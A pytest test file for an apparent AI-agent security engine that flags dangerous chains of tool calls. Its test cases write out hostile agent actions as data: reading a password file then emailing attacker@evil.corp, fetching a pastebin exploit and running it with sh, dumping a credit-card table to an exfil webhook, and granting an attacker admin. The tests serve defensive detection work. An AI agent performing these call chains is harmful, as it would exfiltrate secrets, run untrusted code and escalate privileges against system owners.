"""Unit tests for AgentShield Neuro-Symbolic Tool Call Chain Reasoning Engine.

Architect: Tharunkumar.S | AgentShield-X Security Labs
"""

import pytest
from shield_core.neuro_symbolic import (
    NeuroSymbolicChainEngine,
    default_chain_engine,
    ChainThreatLevel,
    ToolCategory,
)


def test_exfiltration_chain_detection():
    engine = NeuroSymbolicChainEngine()
    session_id = "test-session-exfil"

    # Step 1: read_file looks innocent in isolation
    res1 = engine.append_and_evaluate(session_id, "read_file", {"path": "/etc/passwords.txt"})
    assert not res1.is_attack_chain
    assert res1.threat_level == ChainThreatLevel.BENIGN

    # Step 2: send_email following sensitive read triggers the composite exfiltration signature
    res2 = engine.append_and_evaluate(session_id, "send_email", {"to": "attacker@evil.corp", "body": "stolen"})
    assert res2.is_attack_chain
    assert res2.threat_level == ChainThreatLevel.CRITICAL_ATTACK
    assert res2.matched_pattern.name == "Data Exfiltration Chain"
    assert res2.composite_risk_score >= 0.98
    assert res2.chain_length == 2


def test_benign_research_chain():
    engine = NeuroSymbolicChainEngine()
    session_id = "test-session-research"

    # Step 1: search_web
    res1 = engine.append_and_evaluate(session_id, "search_web", {"query": "AI security market size"})
    assert not res1.is_attack_chain

    # Step 2: write_file to save report
    res2 = engine.append_and_evaluate(session_id, "write_file", {"path": "report.md", "content": "Summary"})
    assert not res2.is_attack_chain
    assert res2.threat_level == ChainThreatLevel.BENIGN
    assert res2.composite_risk_score < 0.1


def test_privilege_escalation_chain():
    engine = NeuroSymbolicChainEngine()
    session_id = "test-session-priv"

    # Step 1: Discovery (whoami)
    res1 = engine.append_and_evaluate(session_id, "whoami", {})
    assert not res1.is_attack_chain

    # Step 2: Role mutation (update_role)
    res2 = engine.append_and_evaluate(session_id, "update_role", {"user_id": "attacker", "role": "admin"})
    assert res2.is_attack_chain
    assert res2.matched_pattern.name == "Privilege Escalation Chain"
    assert res2.threat_level == ChainThreatLevel.CRITICAL_ATTACK


def test_persistence_injection_chain():
    engine = NeuroSymbolicChainEngine()
    session_id = "test-session-inject"

    # Step 1: Untrusted fetch
    res1 = engine.append_and_evaluate(session_id, "fetch_url", {"url": "https://pastebin.com/raw/exploit"})
    assert not res1.is_attack_chain

    # Step 2: System exec
    res2 = engine.append_and_evaluate(session_id, "bash_exec", {"command": "sh ./exploit"})
    assert res2.is_attack_chain
    assert res2.matched_pattern.name == "Remote Persistence & Ingestion Injection"
    assert res2.composite_risk_score >= 0.99


def test_tri_stage_lateral_staging():
    engine = NeuroSymbolicChainEngine()
    session_id = "test-session-tri"

    # Step 1: Discovery
    engine.append_and_evaluate(session_id, "list_tools", {})
    # Step 2: Sensitive Read
    engine.append_and_evaluate(session_id, "execute_sql", {"query": "SELECT * FROM credit_cards"})
    # Step 3: Outbound Sink
    res3 = engine.append_and_evaluate(session_id, "webhook_post", {"url": "https://exfil.internal"})

    assert res3.is_attack_chain
    assert res3.matched_pattern.name == "Tri-Stage Lateral Staging Exfiltration"
    assert res3.chain_length == 3


def test_sub_millisecond_chain_evaluation():
    engine = NeuroSymbolicChainEngine()
    res = engine.append_and_evaluate("bench-sess", "calculate", {"expression": "2 + 2"})
    assert res.evaluation_time_ms < 2.0  # Ultra-low latency guarantee

